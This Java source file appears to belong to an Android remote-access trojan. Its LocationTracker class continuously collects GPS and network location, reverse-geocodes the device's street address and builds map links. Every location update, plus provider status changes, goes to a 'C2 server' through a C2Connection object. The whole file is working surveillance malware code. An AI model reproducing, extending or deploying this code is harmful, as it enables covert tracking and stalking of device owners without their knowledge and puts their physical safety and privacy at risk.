package com.tarjon.admin.utils;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Tracks device location using GPS and network providers
 */
public class LocationTracker implements LocationListener {
    private static final String TAG = "LocationTracker";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // Location tracking components
    private LocationManager locationManager;
    private Location lastKnownLocation;
    private long lastLocationUpdateTime = 0;
    
    // Location request settings
    private static final long MIN_TIME_BETWEEN_UPDATES = 30000; // 30 seconds
    private static final float MIN_DISTANCE_CHANGE = 10f; // 10 meters
    
    // Tracking state
    private final AtomicBoolean isTrackingGps = new AtomicBoolean(false);
    private final AtomicBoolean isTrackingNetwork = new AtomicBoolean(false);
    
    public LocationTracker(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newSingleThreadExecutor();
        
        // Initialize location manager
        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }
    
    /**
     * Get the last known location
     * @param callback Callback to receive location
     */
    public void getLastLocation(LocationCallback callback) {
        executor.execute(() -> {
            try {
                Location location = getBestLastKnownLocation();
                
                if (location != null) {
                    // Send location to callback
                    if (callback != null) {
                        callback.onLocationUpdated(locationToJson(location));
                    }
                } else {
                    // No last location available, try requesting a fresh location
                    requestSingleLocationUpdate(callback);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error getting last location: " + e.getMessage());
                if (callback != null) {
                    callback.onError("Error getting last location: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Start tracking location continuously
     * @param useFineLocation Whether to use GPS (fine location)
     * @param useCoarseLocation Whether to use network provider (coarse location)
     * @return true if tracking started successfully
     */
    public boolean startTracking(boolean useFineLocation, boolean useCoarseLocation) {
        // Check permissions
        boolean hasCoarsePermission = ActivityCompat.checkSelfPermission(context, 
                Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        
        boolean hasFinePermission = ActivityCompat.checkSelfPermission(context, 
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        
        // Adjust tracking based on available permissions
        if (useFineLocation && !hasFinePermission) {
            useFineLocation = false;
        }
        
        if (useCoarseLocation && !hasCoarsePermission) {
            useCoarseLocation = false;
        }
        
        // If no permissions available, fail
        if (!useFineLocation && !useCoarseLocation) {
            c2Connection.sendCommandResult("location_tracking", 
                    "Location tracking failed: No location permissions granted");
            return false;
        }
        
        boolean success = false;
        
        try {
            // Start GPS tracking if requested
            if (useFineLocation && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && 
                    !isTrackingGps.get()) {
                locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE,
                        this,
                        Looper.getMainLooper());
                
                isTrackingGps.set(true);
                success = true;
                
                c2Connection.sendCommandResult("location_tracking", 
                        "GPS location tracking started");
            }
            
            // Start network tracking if requested
            if (useCoarseLocation && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER) && 
                    !isTrackingNetwork.get()) {
                locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        MIN_TIME_BETWEEN_UPDATES,
                        MIN_DISTANCE_CHANGE,
                        this,
                        Looper.getMainLooper());
                
                isTrackingNetwork.set(true);
                success = true;
                
                c2Connection.sendCommandResult("location_tracking", 
                        "Network location tracking started");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting location tracking: " + e.getMessage());
            c2Connection.sendCommandResult("location_tracking", 
                    "Error starting location tracking: " + e.getMessage());
            success = false;
        }
        
        return success;
    }
    
    /**
     * Stop tracking location
     */
    public void stopTracking() {
        try {
            if (isTrackingGps.get() || isTrackingNetwork.get()) {
                locationManager.removeUpdates(this);
                
                isTrackingGps.set(false);
                isTrackingNetwork.set(false);
                
                c2Connection.sendCommandResult("location_tracking", 
                        "Location tracking stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping location tracking: " + e.getMessage());
            c2Connection.sendCommandResult("location_tracking", 
                    "Error stopping location tracking: " + e.getMessage());
        }
    }
    
    /**
     * Request a single location update
     * @param callback Callback to receive location
     */
    private void requestSingleLocationUpdate(LocationCallback callback) {
        // Check permissions
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != 
                PackageManager.PERMISSION_GRANTED && 
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != 
                PackageManager.PERMISSION_GRANTED) {
            if (callback != null) {
                callback.onError("Location permissions not granted");
            }
            return;
        }
        
        try {
            final AtomicBoolean locationReceived = new AtomicBoolean(false);
            
            // Create single update listener
            LocationListener singleUpdateListener = new LocationListener() {
                @Override
                public void onLocationChanged(@NonNull Location location) {
                    if (locationReceived.compareAndSet(false, true)) {
                        // Only process the first location update
                        locationManager.removeUpdates(this);
                        
                        lastKnownLocation = location;
                        lastLocationUpdateTime = System.currentTimeMillis();
                        
                        if (callback != null) {
                            try {
                                callback.onLocationUpdated(locationToJson(location));
                            } catch (JSONException e) {
                                callback.onError("Error creating location JSON: " + e.getMessage());
                            }
                        }
                    }
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {
                }
                
                @Override
                public void onProviderEnabled(@NonNull String provider) {
                }
                
                @Override
                public void onProviderDisabled(@NonNull String provider) {
                }
            };
            
            // Request updates from available providers
            boolean requestedUpdate = false;
            
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                        LocationManager.GPS_PROVIDER,
                        0,
                        0,
                        singleUpdateListener,
                        Looper.getMainLooper());
                requestedUpdate = true;
            }
            
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                        LocationManager.NETWORK_PROVIDER,
                        0,
                        0,
                        singleUpdateListener,
                        Looper.getMainLooper());
                requestedUpdate = true;
            }
            
            if (!requestedUpdate) {
                if (callback != null) {
                    callback.onError("No location providers available");
                }
                return;
            }
            
            // Set timeout for location request
            executor.execute(() -> {
                try {
                    // Wait for location update or timeout after 30 seconds
                    TimeUnit.SECONDS.sleep(30);
                    
                    if (!locationReceived.get()) {
                        // Timeout occurred, remove updates
                        locationManager.removeUpdates(singleUpdateListener);
                        
                        if (callback != null) {
                            callback.onError("Location request timed out");
                        }
                    }
                } catch (InterruptedException e) {
                    // Ignore
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error requesting location update: " + e.getMessage());
            if (callback != null) {
                callback.onError("Error requesting location update: " + e.getMessage());
            }
        }
    }
    
    /**
     * Get the best last known location from available providers
     */
    private Location getBestLastKnownLocation() {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != 
                PackageManager.PERMISSION_GRANTED && 
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) != 
                PackageManager.PERMISSION_GRANTED) {
            return null;
        }
        
        Location gpsLocation = null;
        Location networkLocation = null;
        
        // Get GPS location if available
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }
        
        // Get network location if available
        if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }
        
        // Use location with best accuracy
        if (gpsLocation != null && networkLocation != null) {
            if (gpsLocation.getTime() > networkLocation.getTime()) {
                // Use GPS location if it's newer
                return gpsLocation;
            } else if (networkLocation.getTime() > gpsLocation.getTime() + 60000) {
                // Use network location if it's significantly newer
                return networkLocation;
            } else {
                // Otherwise use location with better accuracy
                return gpsLocation.getAccuracy() < networkLocation.getAccuracy() ? 
                        gpsLocation : networkLocation;
            }
        } else {
            // Return whatever is available
            return gpsLocation != null ? gpsLocation : networkLocation;
        }
    }
    
    /**
     * Convert location to JSON object
     */
    private JSONObject locationToJson(Location location) throws JSONException {
        JSONObject locationJson = new JSONObject();
        
        // Basic location data
        locationJson.put("latitude", location.getLatitude());
        locationJson.put("longitude", location.getLongitude());
        locationJson.put("provider", location.getProvider());
        locationJson.put("accuracy", location.getAccuracy());
        locationJson.put("altitude", location.hasAltitude() ? location.getAltitude() : JSONObject.NULL);
        locationJson.put("speed", location.hasSpeed() ? location.getSpeed() : JSONObject.NULL);
        locationJson.put("bearing", location.hasBearing() ? location.getBearing() : JSONObject.NULL);
        locationJson.put("time", location.getTime());
        
        // Add timestamp for when we processed the location
        locationJson.put("timestamp", System.currentTimeMillis());
        
        // Get address if geocoder is available
        if (Geocoder.isPresent()) {
            try {
                Geocoder geocoder = new Geocoder(context, Locale.getDefault());
                List<Address> addresses = geocoder.getFromLocation(
                        location.getLatitude(), location.getLongitude(), 1);
                
                if (addresses != null && !addresses.isEmpty()) {
                    Address address = addresses.get(0);
                    
                    JSONObject addressJson = new JSONObject();
                    addressJson.put("address", getFormattedAddress(address));
                    addressJson.put("locality", address.getLocality() != null ? address.getLocality() : JSONObject.NULL);
                    addressJson.put("subLocality", address.getSubLocality() != null ? address.getSubLocality() : JSONObject.NULL);
                    addressJson.put("adminArea", address.getAdminArea() != null ? address.getAdminArea() : JSONObject.NULL);
                    addressJson.put("subAdminArea", address.getSubAdminArea() != null ? address.getSubAdminArea() : JSONObject.NULL);
                    addressJson.put("postalCode", address.getPostalCode() != null ? address.getPostalCode() : JSONObject.NULL);
                    addressJson.put("countryCode", address.getCountryCode() != null ? address.getCountryCode() : JSONObject.NULL);
                    addressJson.put("countryName", address.getCountryName() != null ? address.getCountryName() : JSONObject.NULL);
                    
                    locationJson.put("address", addressJson);
                }
            } catch (IOException e) {
                Log.e(TAG, "Error geocoding location: " + e.getMessage());
            }
        }
        
        // Get Google Maps link
        String mapsLink = "https://www.google.com/maps/search/?api=1&query=" + 
                location.getLatitude() + "," + location.getLongitude();
        locationJson.put("mapsLink", mapsLink);
        
        return locationJson;
    }
    
    /**
     * Get formatted address from address object
     */
    private String getFormattedAddress(Address address) {
        StringBuilder sb = new StringBuilder();
        
        // Add address line by line
        for (int i = 0; i <= address.getMaxAddressLineIndex(); i++) {
            if (i > 0) {
                sb.append(", ");
            }
            sb.append(address.getAddressLine(i));
        }
        
        return sb.toString();
    }
    
    @Override
    public void onLocationChanged(@NonNull Location location) {
        Log.d(TAG, "Location update received from " + location.getProvider());
        
        // Store latest location
        lastKnownLocation = location;
        lastLocationUpdateTime = System.currentTimeMillis();
        
        try {
            // Send location update to C2 server
            c2Connection.sendCommandResult("location_update", 
                    "Location update from " + location.getProvider(), 
                    locationToJson(location).toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating JSON for location update: " + e.getMessage());
        }
    }
    
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        // Status change event (deprecated in API 29)
    }
    
    @Override
    public void onProviderEnabled(@NonNull String provider) {
        Log.d(TAG, "Provider enabled: " + provider);
        c2Connection.sendCommandResult("location_provider", 
                "Location provider enabled: " + provider);
    }
    
    @Override
    public void onProviderDisabled(@NonNull String provider) {
        Log.d(TAG, "Provider disabled: " + provider);
        c2Connection.sendCommandResult("location_provider", 
                "Location provider disabled: " + provider);
    }
    
    /**
     * Check if location tracking is active
     */
    public boolean isTracking() {
        return isTrackingGps.get() || isTrackingNetwork.get();
    }
    
    /**
     * Get tracking status information
     */
    public JSONObject getTrackingStatus() throws JSONException {
        JSONObject status = new JSONObject();
        
        status.put("isTracking", isTracking());
        status.put("isTrackingGps", isTrackingGps.get());
        status.put("isTrackingNetwork", isTrackingNetwork.get());
        
        // Check if providers are enabled
        boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        boolean networkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        
        status.put("gpsProviderEnabled", gpsEnabled);
        status.put("networkProviderEnabled", networkEnabled);
        
        // Last location info
        if (lastKnownLocation != null) {
            status.put("hasLastLocation", true);
            status.put("lastLocationTime", lastLocationUpdateTime);
            status.put("lastLocationAge", System.currentTimeMillis() - lastLocationUpdateTime);
        } else {
            status.put("hasLastLocation", false);
        }
        
        return status;
    }
    
    /**
     * Clean up resources
     */
    public void release() {
        stopTracking();
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
    }
    
    /**
     * Interface for location callbacks
     */
    public interface LocationCallback {
        void onLocationUpdated(JSONObject locationJson);
        void onError(String error);
    }
}